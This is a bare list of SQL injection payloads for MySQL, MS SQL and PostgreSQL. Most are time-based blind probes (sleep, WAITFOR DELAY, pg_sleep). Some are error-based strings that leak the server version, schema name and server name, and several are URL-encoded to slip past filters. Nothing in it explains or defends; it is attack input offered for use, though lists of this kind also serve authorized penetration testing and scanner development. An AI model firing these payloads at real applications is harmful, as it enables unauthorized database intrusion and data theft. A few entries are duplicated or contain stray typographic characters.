## MySQL Custom Payloads

- `if(now()=sysdate(),sleep(5),0)`
- `if(now()=sysdate()%2Csleep(5)%2C0)`
- `(select*from(select(sleep(5)))a)`
- `'+OR+SLEEP(5)--+`
- `0'XOR(if (now()=sysdate(), sleep(5),0)) XOR'Z`
- `0'XOR(if (now()=sysdate(), sleep(5),0)) XOR'Z`
- `0"XOR(if(now()=sysdate(), sleep(5),0)) XOR"Z`
- `0"XOR(if(now()=sysdate()%2Csleep(5)%2C0)) XOR"Z`
- `0"xor(if(now()=sysdate(),SLEEP(5),0))xor"Z`
- `1'XOR(SELECT(1)FROM(SELECT(SLEEP(3*2)))a)XOR’Z`
- `1'XOR(SELECT(1)FROM(SELECT(SLEEP(8)))a)XOR’Z, 1' ORDER BY 1 — +`

## MS SQL Custom Payloads

- `2+WAITFOR%20DELAY+'0:0:5'`
- `1 WAITFOR DELAY '0:0:5'--`
- `0'; waitfor delay '0:0:5' --`
- `'+convert(int,@@version)+'`
- `%27%2bconvert(int,@@version)%2b%27`
- `'+convert(int,schema_name())+'`
- `'+convert(int,@@servername())+'`

## PostgreSQL Payloads

- `' OR 1=1; SELECT pg_sleep(5)--`
- `" OR 1=1; SELECT pg_sleep(5)--`
- `1; SELECT pg_sleep(5)--`

